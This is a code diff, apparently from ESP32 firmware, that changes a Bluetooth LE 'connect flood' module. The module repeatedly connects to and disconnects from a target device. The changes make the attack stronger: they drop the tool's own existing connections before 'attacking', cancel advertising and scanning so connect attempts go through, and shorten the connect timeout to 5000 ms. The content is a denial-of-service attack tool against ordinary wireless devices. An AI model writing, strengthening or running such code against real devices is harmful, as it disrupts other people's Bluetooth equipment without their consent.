@@ -103,7 +103,6 @@
 // }
 
 // bool ble_connect_flood_is_running(void) { return running; }
-
 /* BLE connect flood - controlled connect/disconnect attempts */
 #include "ble_connect_flood.h"
 #include "esp_log.h"
@@ -164,8 +163,7 @@ static int conn_event_cb(struct ble_gap_event *event, void *arg) {
                                            BLE_ERR_REM_USER_CONN_TERM);
                 if (rc) ESP_LOGE(TAG, "ble_gap_terminate failed: %d", rc);
 
-                /* After a successful connect+disconnect, the target will likely
-                 * stop advertising for a while. Add a longer cooldown. */
+                /* After a successful connect+disconnect, cooldown */
                 vTaskDelay(pdMS_TO_TICKS(5000));
             } else {
                 ESP_LOGW(TAG, "Connection failed: status=%d", event->connect.status);
@@ -198,19 +196,25 @@ static int conn_event_cb(struct ble_gap_event *event, void *arg) {
 static void flood_task(void *arg) {
     ESP_LOGI(TAG, "Connect flood task started for target %s", target);
 
+    /* Kill any existing BLE connections (e.g. phone) before attacking */
+    ble_common_disconnect_all();
+    vTaskDelay(pdMS_TO_TICKS(1000));
+
     while (running) {
-        /* Don't attempt connect if another GAP procedure is active */
+        /* Don't attempt connect if a connection is already active */
         if (ble_gap_conn_active()) {
             vTaskDelay(pdMS_TO_TICKS(200));
             continue;
         }
         if (ble_gap_adv_active()) {
+            /* Cancel advertising so we can connect */
+            ble_gap_adv_stop();
             vTaskDelay(pdMS_TO_TICKS(100));
-            continue;
         }
         if (ble_gap_disc_active()) {
-            vTaskDelay(pdMS_TO_TICKS(100));
-            continue;
+            /* Cancel any running scan (e.g. GATT probe) so we can connect */
+            ble_gap_disc_cancel();
+            vTaskDelay(pdMS_TO_TICKS(200));
         }
 
         /* Safely copy target address */
@@ -233,7 +237,7 @@ static void flood_task(void *arg) {
 
         uint8_t own_addr_type = ble_common_own_addr_type();
 
-        int rc = ble_gap_connect(own_addr_type, &peer, 30000,
+        int rc = ble_gap_connect(own_addr_type, &peer, 5000,
                                  &conn_params, conn_event_cb, NULL);
         if (rc != 0) {
             if (rc == BLE_HS_EALREADY) {
